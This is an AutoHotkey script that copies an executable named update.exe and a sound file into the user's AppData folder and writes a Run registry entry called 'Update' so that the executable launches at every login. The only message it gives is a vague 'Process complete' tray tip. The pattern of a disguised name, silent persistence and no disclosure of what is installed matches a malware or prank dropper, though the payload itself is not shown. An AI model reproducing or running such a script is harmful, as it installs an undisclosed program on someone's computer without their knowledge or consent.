#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
#Warn  ; Recommended for catching common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

;msgBox %A_AppData%
fileCopy, update.exe, %A_AppData%
fileCopy, sound.mp3, %A_AppData%
RegWrite, REG_SZ, HKEY_CURRENT_USER, Software\Microsoft\Windows\CurrentVersion\Run, Update, "%A_AppData%\update.exe"
trayTip, Process, Process complete., 5, 0
sleep 5000